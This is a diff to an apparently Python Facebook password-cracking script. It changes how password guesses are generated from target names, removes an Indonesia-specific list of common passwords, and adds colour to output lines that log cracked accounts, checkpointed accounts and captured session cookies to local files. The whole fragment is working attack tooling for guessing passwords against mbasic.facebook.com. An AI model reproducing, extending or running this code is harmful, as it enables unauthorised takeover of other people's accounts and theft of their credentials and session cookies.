@@ -369,18 +369,13 @@ def generate(text):
 		else:
 			i=i.lower()
 			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i)
 				results.append(i+"123")
 				results.append(i+"12345")
 			else:
-				results.append(i+"123")
-				results.append(i+"1234")
-				results.append(i+"12345")
 				results.append(i)
-				if "indonesia" in ips:
-					results.append("sayang")
-					results.append("bismillah")
-					results.append("anjing")
-                                        results.append("123456")
+				results.append(i+"123")
+				results.append(i+"12345")
 	return results
 
 def logs():
@@ -479,7 +474,7 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r   [OK] %s • %s               "%(fl.get("id"),i))
+					print("\r\x1b[0;32m   [OK] %s • %s               "%(fl.get("id"),i))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -489,7 +484,7 @@ class crack:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r   [CP] %s • %s               "%(fl.get("id"),i))
+					print("\r\x1b[0;33m   [CP] %s • %s               "%(fl.get("id"),i))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
